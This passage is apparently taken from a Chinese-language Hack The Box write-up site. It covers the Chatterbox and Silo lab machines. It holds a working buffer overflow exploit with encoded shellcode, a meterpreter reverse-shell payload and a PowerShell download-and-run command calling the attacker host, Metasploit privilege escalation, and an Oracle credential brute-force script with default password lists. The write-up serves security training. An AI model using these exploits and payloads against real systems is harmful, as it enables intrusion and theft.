b\"\\x33\\x47\\x4f\\x36\\x4b\\x57\\x4b\\x4f\\x58\\x55\\x58\\x38\\x44\"\nbuf += b\"\\x50\\x4b\\x51\\x4d\\x30\\x4d\\x30\\x4d\\x59\\x37\\x54\\x30\\x54\"\nbuf += b\"\\x52\\x30\\x31\\x58\\x4d\\x59\\x55\\x30\\x52\\x4b\\x4b\\x50\\x4b\"\nbuf += b\"\\x4f\\x38\\x55\\x52\\x30\\x50\\x50\\x42\\x30\\x32\\x30\\x51\\x30\"\nbuf += b\"\\x32\\x30\\x51\\x30\\x52\\x30\\x43\\x38\\x4a\\x4a\\x4c\\x4f\\x49\"\nbuf += b\"\\x4f\\x49\\x50\\x4b\\x4f\\x38\\x55\\x56\\x37\\x32\\x4a\\x4c\\x45\"\nbuf += b\"\\x43\\x38\\x4b\\x5a\\x4c\\x4a\\x4e\\x30\\x4d\\x33\\x32\\x48\\x4d\"\nbuf += b\"\\x32\\x4b\\x50\\x4e\\x31\\x51\\x4c\\x55\\x39\\x39\\x56\\x31\\x5a\"\nbuf += b\"\\x4c\\x50\\x32\\x36\\x50\\x57\\x42\\x48\\x56\\x39\\x35\\x55\\x53\"\nbuf += b\"\\x44\\x51\\x51\\x4b\\x4f\\x4a\\x35\\x44\\x45\\x57\\x50\\x53\\x44\"\nbuf += b\"\\x4c\\x4c\\x4b\\x4f\\x30\\x4e\\x4c\\x48\\x34\\x35\\x4a\\x4c\\x43\"\nbuf += b\"\\x38\\x4a\\x50\\x56\\x55\\x35\\x52\\x50\\x56\\x4b\\x4f\\x38\\x55\"\nbuf += b\"\\x33\\x38\\x43\\x33\\x52\\x4d\\x42\\x44\\x4d\\x30\\x55\\x39\\x59\"\nbuf += b\"\\x53\\x42\\x37\\x30\\x57\\x50\\x57\\x30\\x31\\x4b\\x46\\x52\\x4a\"\nbuf += b\"\\x4d\\x42\\x50\\x59\\x51\\x46\\x59\\x52\\x4b\\x4d\\x52\\x46\\x37\"\nbuf += b\"\\x57\\x50\\x44\\x4e\\x44\\x4f\\x4c\\x4d\\x31\\x4d\\x31\\x54\\x4d\"\nbuf += b\"\\x50\\x44\\x4d\\x54\\x4c\\x50\\x48\\x46\\x4d\\x30\\x51\\x34\\x42\"\nbuf += b\"\\x34\\x32\\x30\\x52\\x36\\x30\\x56\\x32\\x36\\x31\\x36\\x42\\x36\"\nbuf += b\"\\x30\\x4e\\x52\\x36\\x30\\x56\\x50\\x53\\x52\\x36\\x32\\x48\\x34\"\nbuf += b\"\\x39\\x58\\x4c\\x4f\\x4f\\x44\\x46\\x4b\\x4f\\x58\\x55\\x33\\x59\"\nbuf += b\"\\x4b\\x30\\x50\\x4e\\x42\\x36\\x31\\x36\\x4b\\x4f\\x4e\\x50\\x33\"\nbuf += b\"\\x38\\x4d\\x38\\x44\\x47\\x4d\\x4d\\x33\\x30\\x4b\\x4f\\x5a\\x35\"\nbuf += b\"\\x57\\x4b\\x39\\x50\\x4d\\x4d\\x4d\\x5a\\x4b\\x5a\\x42\\x48\\x45\"\nbuf += b\"\\x56\\x56\\x35\\x47\\x4d\\x45\\x4d\\x4b\\x4f\\x48\\x55\\x4f\\x4c\"\nbuf += b\"\\x4c\\x46\\x43\\x4c\\x4c\\x4a\\x53\\x50\\x4b\\x4b\\x49\\x50\\x32\"\nbuf += b\"\\x55\\x4b\\x55\\x37\\x4b\\x50\\x47\\x4d\\x43\\x33\\x42\\x42\\x4f\"\nbuf += b\"\\x42\\x4a\\x4b\\x50\\x50\\x53\\x4b\\x4f\\x38\\x55\\x41\\x41\"\n\ndef main (buf):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    server_address = ('10.10.10.74', 9256)\n\n    fs = \"\\x55\\x2A\\x55\\x6E\\x58\\x6E\\x05\\x14\\x11\\x6E\\x2D\\x13\\x11\\x6E\\x50\\x6E\\x58\\x43\\x59\\x39\"\n    p  = \"A0000000002#Main\" + \"\\x00\" + \"Z\"*114688 + \"\\x00\" + \"A\"*10 + \"\\x00\"\n    p += \"A0000000002#Main\" + \"\\x00\" + \"A\"*57288 + \"AAAAASI\"*50 + \"A\"*(3750-46)\n    p += \"\\x62\" + \"A\"*45\n    p += \"\\x61\\x40\"\n    p += \"\\x2A\\x46\"\n    p += \"\\x43\\x55\\x6E\\x58\\x6E\\x2A\\x2A\\x05\\x14\\x11\\x43\\x2d\\x13\\x11\\x43\\x50\\x43\\x5D\" + \"C\"*9 + \"\\x60\\x43\"\n    p += \"\\x61\\x43\" + \"\\x2A\\x46\"\n    p += \"\\x2A\" + fs + \"C\" * (157-len(fs)- 31-3)\n    p += buf + \"A\" * (1152 - len(buf))\n    p += \"\\x00\" + \"A\"*10 + \"\\x00\"\n\n    print bcolours.GREEN + \"[\" + bcolours.TURQ + \"+\" + bcolours.GREEN + \"]\" + bcolours.ENDC + \" BUFFER OVERFLOW PAYLOAD RELEASED -- CHECK YOUR HANDLER\"\n\n    i=0\n    while i&lt;len(p):\n        if i &gt; 172000:\n            time.sleep(1.0)\n        sent = sock.sendto(p[i:(i+8192)], server_address)\n        i += sent\n    sock.close()\n\nif __name__=='__main__':\n    main(buf)\n</code></pre>"},{"location":"CTF/HTB/Windows-chatterbox/index.html#shell","title":"\u53cd\u5f39shell","text":"<pre><code>\u250c\u2500\u2500(root\ud83d\udc80kali)-[~/Desktop/Chatterbox]\n\u2514\u2500# nc -lnvp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.3] from (UNKNOWN) [10.10.10.74] 49157\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nchatterbox\\alfred\n\nC:\\Windows\\system32&gt;\n</code></pre>"},{"location":"CTF/HTB/Windows-chatterbox/index.html#_3","title":"\u63d0\u6743","text":"<p>\u5f53\u524d\u5bf9\u4e8eAdministrator\u7684\u684c\u9762\u6587\u4ef6\u5939\u6709\u5b8c\u5168\u63a7\u5236\u6743\u9650\uff0c\u56e0\u6b64\u6211\u4eec\u65e0\u9700\u63d0\u6743\u5c31\u53ef\u4ee5\u8bfb\u53d6root.txt</p> <p>icacls \u662f Windows \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u7528\u4e8e\u7ba1\u7406\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u7684\u8bbf\u95ee\u63a7\u5236\u5217\u8868 (ACL, Access Control List)\u3002ACL \u662f\u4e00\u4e2a\u8868\uff0c\u5b9a\u4e49\u4e86\u7528\u6237\u6216\u7ec4\u5bf9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u8bbf\u95ee\u6743\u9650\u3002\u4f7f\u7528 icacls \u5de5\u5177\uff0c\u53ef\u4ee5\u67e5\u770b\u3001\u8bbe\u7f6e\u3001\u4fee\u6539\u548c\u5907\u4efd\u8fd9\u4e9b\u6743\u9650\u3002</p> <p>\u663e\u793a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6743\u9650\uff1aicacls filename</p> <p>\u4e3a\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u6dfb\u52a0\u6743\u9650\uff1aicacls filename /grant UserName:(permissions)</p> <p>\u5220\u9664\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6743\u9650\uff1aicacls filename /remove UserName</p> <p>\u66ff\u6362\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6743\u9650\uff1aicacls filename /replace UserName:(permissions)</p> <p>\u5907\u4efd\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6743\u9650\uff1aicacls filename /save aclfile /t    (aclfile \u662f\u4fdd\u5b58\u6743\u9650\u4fe1\u606f\u7684\u6587\u4ef6\uff0c/t \u8868\u793a\u5305\u62ec\u5b50\u76ee\u5f55)</p> <p>\u6062\u590d\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u7684\u6743\u9650\uff1aicacls filename /restore aclfile</p> <pre><code>c:\\Users\\Administrator\\Desktop&gt;icacls ./\nicacls ./\n./ NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)\n   CHATTERBOX\\Administrator:(I)(OI)(CI)(F)\n   BUILTIN\\Administrators:(I)(OI)(CI)(F)\n   CHATTERBOX\\Alfred:(I)(OI)(CI)(F)\n</code></pre> <p></p> <p></p> <p></p> <p></p> <p>\u53ea\u662f\u5bf9root.txt\u6ca1\u6709\u8bfb\u6743\u9650</p> <pre><code>c:\\Users\\Administrator\\Desktop&gt;icacls root.txt\nicacls root.txt\nroot.txt CHATTERBOX\\Administrator:(F)\n\nSuccessfully processed 1 files; Failed processing 0 files\n</code></pre> <p>\u53ea\u9700\u8981\u5bf9alfred\u8d4b\u4e88\u5b8c\u5168\u63a7\u5236\u6743\u9650\u64cd\u4f5croot.txt\uff0c\u5c31\u53ef\u4ee5\u64cd\u4f5c\u8bfb\u53d6\u8be5\u6587\u4ef6</p> <pre><code>c:\\Users\\Administrator\\Desktop&gt;icacls root.txt /grant alfred:F\nprocessed file: root.txt\nSuccessfully processed 1 files; Failed processing 0 files\n\nc:\\Users\\Administrator\\Desktop&gt;type root.txt\ntype root.txt\n4148f631....\n</code></pre>"},{"location":"CTF/HTB/Windows-chatterbox/index.html#winpeas","title":"\u4f20winpeas\u679a\u4e3e","text":"<p>\u7f16\u8bd1\u4e00\u4e2ameterpreter <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4455 -f exe &gt; shell.exe</code></p> <p>\u4f20\u5230\u9776\u673a <code>powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.10.16.3:8000/shell.exe','c:\\Users\\Alfred\\Desktop\\shell.exe')\"</code></p> <p>\u62ff\u5230shell\u4ee5\u540e\u6267\u884c<code>post/multi/recon/local_exploit_suggester</code></p> <pre><code>meterpreter &gt; run post/multi/recon/local_exploit_suggester\n\n[*] 10.10.10.74 - Collecting local exploits for x86/windows...\n[*] 10.10.10.74 - 37 exploit checks are being tried...\n[+] 10.10.10.74 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.\nnil versions are discouraged and will be deprecated in Rubygems 4\n[+] 10.10.10.74 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.\n[+] 10.10.10.74 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.\n[+] 10.10.10.74 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.\n[+] 10.10.10.74 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.74 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.\n[+] 10.10.10.74 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n[+] 10.10.10.74 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.\n[+] 10.10.10.74 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.\n[+] 10.10.10.74 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.\n</code></pre> <p>\u4f7f\u7528\u6a21\u5757<code>exploit/windows/local/ntusermndragover</code>\u63d0\u6743\u5230system</p> <pre><code>msf6 exploit(windows/local/ntusermndragover) &gt; run\n\n[*] Started reverse TCP handler on 10.10.16.3:4444 \n[*] Executing automatic check (disable AutoCheck to override)\n[+] The target appears to be vulnerable.\n[*] Launching notepad.exe to host the exploit...\n[+] Process 5532 launched.\n[*] Injecting exploit into 5532 ...\n[*] Exploit injected. Injecting payload into 5532...\n[*] Payload injected. Executing exploit...\n[*] Sending stage (175174 bytes) to 10.10.10.74\n[*] Meterpreter session 8 opened (10.10.16.3:4444 -&gt; 10.10.10.74:49165) at 2022-01-07 04:32:54 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>"},{"location":"CTF/HTB/Windows-silo/index.html","title":"\u4fe1\u606f\u641c\u96c6","text":""},{"location":"CTF/HTB/Windows-silo/index.html#nmap","title":"Nmap","text":"<pre><code>root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.82\n...\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n1521/tcp  open  oracle\n5985/tcp  open  wsman\n47001/tcp open  winrm\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49158/tcp open  unknown\n49160/tcp open  unknown\n49161/tcp open  unknown\n49162/tcp open  unknown\n...\nroot@kali# nmap -sC -sV -oA nmap/details 10.10.10.82\n...\nPORT      STATE SERVICE      VERSION\n80/tcp    open  http         Microsoft IIS httpd 8.5\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/8.5\n|_http-title: IIS Windows Server\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn?\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49158/tcp open  msrpc        Microsoft Windows RPC\n49160/tcp open  oracle-tns   Oracle TNS listener (requires service name)                                                                                 49161/tcp open  msrpc        Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submi\nt.cgi?new-service :\nSF-Port139-TCP:V=7.70%I=7%D=4/21%Time=5ADBEBEB%P=x86_64-pc-linux-gnu%r(Get\nSF:Request,5,\"\\x83\\0\\0\\x01\\x8f\");\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -1s, deviation: 0s, median: -1s\n| smb-security-mode:\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: supported\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2018-04-21 21:58:51\n|_  start_date: 2018-04-21 15:47:47\n...\n</code></pre> <p>\u626b\u63cf\u51fa\u7684\u7aef\u53e3\u6709\u76f8\u5f53\u591a\u7684\u5f00\u653e\u7aef\u53e3\uff0c\u5305\u62ec http\uff0880\uff09\u3001RPC \uff08135\uff09\u3001SMB \uff08139\uff0c 445\uff09 \u548c Oracle TNS listener \uff081521\uff09\u3002</p>"},{"location":"CTF/HTB/Windows-silo/index.html#web-port-80","title":"Web - Port 80","text":""},{"location":"CTF/HTB/Windows-silo/index.html#gobuster","title":"Gobuster","text":"<pre><code>root@kali# gobuster -u http://10.10.10.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html -t 30\n...\n...\n</code></pre> <p>\u4ec0\u4e48\u4e5f\u6ca1\u6709\u627e\u5230\u3002</p>"},{"location":"CTF/HTB/Windows-silo/index.html#oracle-db-port-1521","title":"Oracle db - Port 1521","text":"<p>\u4e3a\u4e86\u548cOracle\u4ea4\u4e92\uff0c\u6211\u4eec\u9700\u8981\u7528\u5230sqlplus\uff0cODAT;\u5176\u4e2dODAT\u9700\u8981\u4f7f\u7528\u5230sqlplus\u624d\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\u3002</p> <p>sqlplus:sqlplus\u662f\u4e00\u4e2a\u4e0eOracle\u4ea4\u4e92\u7684\u5de5\u5177.Oracle \u6570\u636e\u5e93\u4e2d\u6240\u6709\u7684\u7ba1\u7406\u64cd\u4f5c\u90fd\u53ef\u4ee5\u901a\u8fc7sqlplus\u5de5\u5177\u5b8c\u6210\u3002sqlplus \u53ef\u4ee5\u8fd0\u884c\u4e8e\u4efb\u4f55Oracle\u6570\u636e\u5e93\u53ef\u8fd0\u884c\u7684\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\uff0c\u5176\u4f7f\u7528\u65b9\u6cd5\u57fa\u672c\u76f8\u540c\u3002</p> <p>ODAT:Oracle Database Attacking Tool ,Oracle \u6570\u636e\u5e93\u653b\u51fb\u5de5\u5177 \u3002</p> <p>\u4ee5\u4e0a\u4fe9\u5de5\u5177\u7684\u5177\u4f53\u64cd\u4f5c\u540e\u9762\u4f1a\u6709\u3002</p>"},{"location":"CTF/HTB/Windows-silo/index.html#sqlplusodat","title":"\u4e0b\u8f7dsqlplus\u548cODAT","text":"<pre><code>apt install oracle-instantclient-sqlplus\napt install odat\n</code></pre>"},{"location":"CTF/HTB/Windows-silo/index.html#sid","title":"\u83b7\u53d6SID","text":"<p>\u9488\u5bf9 Oracle \u6570\u636e\u5e93\u6211\u4eec\u9700\u8981\u9996\u5148\u83b7\u53d6\u76ee\u6807\u7684SID\uff0c\u8fd9\u91cc\u4ecb\u7ecd\u4e24\u79cd\u65b9\u6cd5\uff1aMSF \u4ee5\u53ca odat</p>"},{"location":"CTF/HTB/Windows-silo/index.html#odatsid","title":"odat\u83b7\u53d6SID","text":"<p>ODAT\uff1a\u4e00\u6b3e\u4e13\u95e8\u7528\u4e8eOracle\u6e17\u900f\u7684\u5de5\u5177</p> <p>ODAT\u4f7f\u7528\u573a\u666f\u793a\u4f8b\uff1a\u4f60\u5e0c\u671b\u627e\u5230\u8fdc\u7aefOracle\u6570\u636e\u5e93\u7684SID\u548c\u6709\u6548\u51ed\u8bc1\u4ee5\u8fde\u63a5\u6570\u636e\u5e93\uff1b\u4f60\u5df2\u83b7\u53d6\u5230\u4e00\u4e2a\u6709\u6548\u7684Oracle\u5e10\u6237\uff0c\u5e76\u60f3\u5c06\u4f60\u7684\u6743\u9650\u63d0\u5347\u4e3aDBA\u6216SYSDBA\uff1b\u4f60\u6709\u4e00\u4e2aOracle\u5e10\u6237\uff0c\u5e76\u5e0c\u671b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff08\u4f8b\u5982\uff0c\u53cd\u5411shell\uff09\uff0c\u4ee5\u5728\u6258\u7ba1\u6570\u636e\u5e93\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u8fdb\u4e00\u6b65\u7684\u6e17\u900f</p> <p>ODAT\u7684\u8be6\u7ec6\u4ecb\u7ecd\uff1ahttps://www.freebuf.com/sectool/163627.html</p> <p>\u4f7f\u7528 odat \u83b7\u53d6SID\uff0c\u626b\u63cf\u7ed3\u679c\u663e\u793a SID \u4e3aXE\u3001XEXDB</p> <pre><code>odat sidguesser -s 10.10.10.82\n</code></pre> <p></p> <p>XE\u3001XEXDB\uff1a\u5728Oracle\u6570\u636e\u5e93\u4e2d\uff0cSID\uff08System Identifier\uff09\u662f\u7528\u4e8e\u6807\u8bc6\u6570\u636e\u5e93\u5b9e\u4f8b\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002\u5177\u4f53\u5230SID\u4e3aXE\u548cXEXDB\uff0c\u5b83\u4eec\u901a\u5e38\u4e0eOracle\u7684Express Edition\uff08XE\uff09\u76f8\u5173\u3002</p> <p>XE:XE\u901a\u5e38\u4ee3\u8868Oracle Database Express Edition\u3002Oracle XE\u662fOracle\u516c\u53f8\u63d0\u4f9b\u7684\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u3001\u514d\u8d39\u7684\u6570\u636e\u5e93\u7248\u672c\uff0c\u9002\u7528\u4e8e\u5b66\u4e60\u3001\u5f00\u53d1\u548c\u5c0f\u578b\u5e94\u7528\u3002\u5f53SID\u4e3aXE\u65f6\uff0c\u8fd9\u610f\u5473\u7740\u8fd9\u662f\u4e00\u4e2aOracle Database Express Edition\u7684\u5b9e\u4f8b\u3002\u901a\u5e38\u5728\u5b89\u88c5Oracle XE\u65f6\uff0c\u9ed8\u8ba4\u7684SID\u5c31\u662fXE\u3002</p> <p>XEXDB:XEXDB\u662fOracle XE\u4e2d\u7684\u5185\u90e8\u6570\u636e\u5e93\u6216XML\u6570\u636e\u5e93\u7684\u6807\u8bc6\u7b26\u3002\u5728Oracle XE\u4e2d\uff0cXEXDB\u4ee3\u8868\u7684\u662fXML\u6570\u636e\u5e93\u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u5b58\u50a8\u548c\u7ba1\u7406XML\u6570\u636e\u3002\u8be5\u5b9e\u4f8b\u662fOracle\u5185\u7f6e\u7684\uff0c\u901a\u5e38\u4e0d\u9700\u8981\u7528\u6237\u76f4\u63a5\u8fdb\u884c\u592a\u591a\u7684\u4ea4\u4e92\uff0c\u5b83\u4e3b\u8981\u7528\u4e8eOracle\u5185\u90e8\u7ba1\u7406XML\u6570\u636e\u7684\u64cd\u4f5c\u3002</p> <p>\u5728\u5b89\u88c5Oracle XE\u540e\uff0c\u901a\u5e38\u4f1a\u770b\u5230\u4ee5\u4e0b\u4e24\u4e2aSID\uff1a</p> <p>XE\uff1a\u4ee3\u8868\u6574\u4e2a\u6570\u636e\u5e93\u5b9e\u4f8b\uff0c\u662f\u7528\u6237\u4e3b\u8981\u8fdb\u884c\u4ea4\u4e92\u7684\u6570\u636e\u5e93\u5b9e\u4f8b\u3002 XEXDB\uff1a\u4e3b\u8981\u7528\u4e8e\u5185\u90e8\u7684XML\u6570\u636e\u5b58\u50a8\u548c\u7ba1\u7406\uff0c\u4e0d\u9700\u8981\u7528\u6237\u76f4\u63a5\u64cd\u4f5c\u3002</p> <p>\u5728\u914d\u7f6e\u548c\u4f7f\u7528Oracle XE\u65f6\uff0c\u60a8\u901a\u5e38\u4f1a\u8fde\u63a5\u5230SID\u4e3aXE\u7684\u6570\u636e\u5e93\u5b9e\u4f8b\u3002\u4f8b\u5982\uff0c\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8fde\u63a5\u5230XE\u5b9e\u4f8b\uff1asqlplus system@XE</p> <p>\u8fd9\u662f\u7528\u4e8e\u8fde\u63a5\u5230Oracle XE\u6570\u636e\u5e93\u5b9e\u4f8b\u7684\u5e38\u89c1\u65b9\u5f0f\u3002XEXDB\u5219\u662f\u5185\u90e8\u4f7f\u7528\u7684\uff0c\u4e0d\u9700\u8981\u8fdb\u884c\u989d\u5916\u7684\u914d\u7f6e\u548c\u7ba1\u7406\u3002</p>"},{"location":"CTF/HTB/Windows-silo/index.html#msfsid","title":"MSF\u83b7\u53d6SID","text":"<pre><code>msfconsole\nmsf &gt; use auxiliary/admin/oracle/sid_brute\nmsf &gt; set rhosts 10.10.10.82\nmsf &gt; run\n</code></pre> <p>\u626b\u63cf\u7ed3\u679c\u4e2d\u53ef\u53d1\u73b0 SID \u5b58\u5728\u56db\u4e2a\uff0c\u5206\u522b\u662fXE\u3001XEXDB\u3001PLSExtProc\u548cCLRExtProc\u3002\u76f8\u5bf9\u4e8eODAT\u6765\u8bf4 MSF \u53d1\u73b0 SID \u660e\u663e\u66f4\u591a.</p>"},{"location":"CTF/HTB/Windows-silo/index.html#oracle","title":"\u7206\u7834Oracle\u6570\u636e\u5e93","text":"<p>\u7206\u7834 Oracle \u8d26\u53f7\u5bc6\u7801\u53ef\u4ee5\u4f7f\u7528 MSF \u3001odat \u4e2d\u5173\u4e8e Oracle \u7206\u7834\u7684\u76f8\u5173\u6a21\u5757\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4f7f\u7528\u81ea\u5199\u811a\u672c.</p>"},{"location":"CTF/HTB/Windows-silo/index.html#_2","title":"\u81ea\u5199\u811a\u672c\u7206\u7834","text":"<pre><code>#!/usr/bin/env python\n\nimport cx_Oracle  //\u7528\u4e8e\u8fde\u63a5\u548c\u64cd\u4f5cOracle\u6570\u636e\u5e93\nimport sys\nfrom multiprocessing import Pool\n\nMAX_PROC = 50\nhost = \"10.10.10.82\"\nsid = \"XE\"    //Oracle\u6570\u636e\u5e93\u5b9e\u4f8b\u7684\u6807\u8bc6\u7b26,\u8fd9\u91cc\u4e3aXE.\n\ndef usage():   //\u7528\u4e8e\u6253\u5370\u811a\u672c\u7684\u4f7f\u7528\u8bf4\u660e\n    print(\"{} [ip] [wordlist]\".format(sys.argv[0]))\n    print(\"  wordlist should be of the format [username]:[password]\")\n    sys.exit(1)\n\ndef scan(userpass):   //\u63a5\u53d7\u4e00\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u7ec4\u5408(\u683c\u5f0f\u4e3ausername:password)\n    u, p = userpass.split(':')[:2]\n    try:\n        conn = cx_Oracle.connect('{user}/{pass_}@{ip}/{sid}'.format(user=u, pass_=p, ip=host, sid=sid))\n        return u, p, True\n    except cx_Oracle.DatabaseError:\n        return u, p, False\n\n\ndef main(host, userpassfile, nprocs=MAX_PROC):   //\u8bfb\u53d6\u5305\u542b\u7528\u6237\u540d\u548c\u5bc6\u7801\u7ec4\u5408\u7684\u6587\u4ef6userpassfile\n    with open(userpassfile, 'r') as f:\n       userpass = f.read().rstrip().replace('\\r','').split('\\n')\n\n    pool = Pool(processes=nprocs)\n\n    for username, pass_, status in pool.imap_unordered(scan, [up for up in userpass]):\n        if status:\n            print(\"Found {} / {}\\n\\n\".format(username, pass_))\n        else:\n            sys.stdout.write(\"\\r {}/{}                               \".format(username, pass_))\n\nif __name__ == '__main__':\n    if len(sys.argv) != 3:\n        usage()\n    main(sys.argv[1], sys.argv[2])\n//\u8fd9\u4e2a\u811a\u672c\u7684\u4e3b\u8981\u4f5c\u7528\u662f\u901a\u8fc7\u66b4\u529b\u7834\u89e3\u7684\u65b9\u5f0f\uff0c\u6279\u91cf\u6d4b\u8bd5\u4e00\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u5217\u8868\uff0c\u5c1d\u8bd5\u8fde\u63a5\u5230\u6307\u5b9a\u7684Oracle\u6570\u636e\u5e93\u5b9e\u4f8b\uff0c\u4ee5\u627e\u5230\u6709\u6548\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u5bf9\u3002\u8be5\u811a\u672c\u4f7f\u7528\u591a\u8fdb\u7a0b\u5e76\u884c\u5904\u7406\uff0c\u63d0\u9ad8\u4e86\u6d4b\u8bd5\u7684\u6548\u7387\u3002\n</code></pre> <p>\u9664\u4e86\u811a\u672c\u4ee5\u5916\u8fd8\u9700\u8981\u6784\u9020\u5b57\u5178\uff0c\u4ee5\u4e0b\u4e3a Oracle \u6570\u636e\u5e93\u9ed8\u8ba4\u7528\u6237\u548c\u9ed8\u8ba4\u5bc6\u7801\uff0c\u4f7f\u7528\u5b83\u4f5c\u4e3a\u5b57\u5178\u8f85\u52a9\u7206\u7834</p> <p></p> <pre><code>sys:change_on_install\nsystem:manager\nsysman:oem_temp\nscott:tiger\naqadm:aqadm\nDbsnmp:dbsnmp\n</code></pre> <p>\u4f7f\u7528\u81ea\u5199\u811a\u672c\u8fdb\u884c\u7206\u7834</p> <pre><code>python3 brute.py 10.10.10.82 userpass.txt\n</code></pre> <p></p> <p>\u6210\u529f\u83b7\u5f97\u8d26\u53f7\u5bc6\u7801\uff1ascott/tiger\u3001Dbsnmp/dbsnmp</p>"},{"location":"CTF/HTB/Windows-silo/index.html#msf","title":"MSF\u7206\u7834","text":"<pre><code>msf &gt; use auxiliary/admin/oracle/oracle_login\nmsf &gt; set rhosts 10.10.10.82\nmsf &gt; set sid XE\nmsf &gt; run\n</code></pre> <p>MSF\u4e5f\u80fd\u591f\u6210\u529f\u7206\u7834\u51fa\u5bf9\u5e94\u7684\u8d26\u53f7\u5bc6\u7801</p>"},{"location":"CTF/HTB/Windows-silo/index.html#shell","title":"\u83b7\u53d6shell","text":""},{"location":"CTF/HTB/Windows-silo/index.html#_3","title":"\u767b\u5f55\u6570\u636e\u5e93","text":"<p>\u4f7f\u7528 sqlplus \u501f\u52a9\u4ee5\u4e0a\u8d26\u53f7\u5bc6\u7801\u767b\u5f55\u6570\u636e\u5e93</p> <pre><code>sqlplus scott/tiger@10.10.10.82:1521/XE\n</code></pre> <p></p> <p>\u4f46\u662f\u9ed8\u8ba4\u60c5\u51b5\u4e0b scott \u7528\u6237\u4e0d\u662f sysdba \u89d2\u8272\uff0c\u901a\u8fc7SQL\u8bed\u53e5\u67e5\u8be2\u5f53\u524d\u6743\u9650\u4e5f\u9a8c\u8bc1\u4e86\u8fd9\u4e00\u7ed3\u679c</p> <pre><code>select * from user_role_privs;\n</code></pre> <p></p> <p>\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u501f\u52a9as sysdba\u547d\u4ee4\u8fdb\u884c\u6743\u9650\u63d0\u5347</p> <pre><code>sqlplus scott/tiger@10.10.10.82:1521/XE as sysdba\n</code></pre> <p>\u6267\u884c\u8fc7\u540e\u53d1\u73b0\u5f53\u524d\u6743\u9650\u5df2\u4e3a sysdba</p> <p></p> <p>\u5229\u7528 SQLPlus\u53ef\u4ee5\u5b9e\u73b0\u4ee5\u4e0b\u64cd\u4f5c: \u8f93\u5165\u3001\u7f16\u8f91\u3001\u5b58\u50a8\u3001\u63d0\u53d6\u3001\u8fd0\u884c\u548c\u8c03\u8bd5SQL\u8bed\u53e5\u548cPL/SQL\u7a0b\u5e8f; \u5f00\u53d1\u3001\u6267\u884c\u6279\u5904\u7406\u811a\u672c; \u6267\u884c\u6570\u636e\u5e93\u7ba1\u7406; \u5904\u7406\u6570\u636e\u3001\u751f\u6210\u62a5\u8868\u3001\u5b58\u50a8\u3001\u6253\u5370\u3001\u683c\u5f0f\u5316\u67e5\u8be2\u7ed3\u679c; \u68c0\u67e5\u8868\u548c\u6570\u636e\u5e93\u5bf9\u8c61\u5b9a\u4e49; \u542f\u52a8/\u5173\u95ed\u6570\u636e\u5e93\u5b9e\u4f8b\u3002</p> <p>SQL 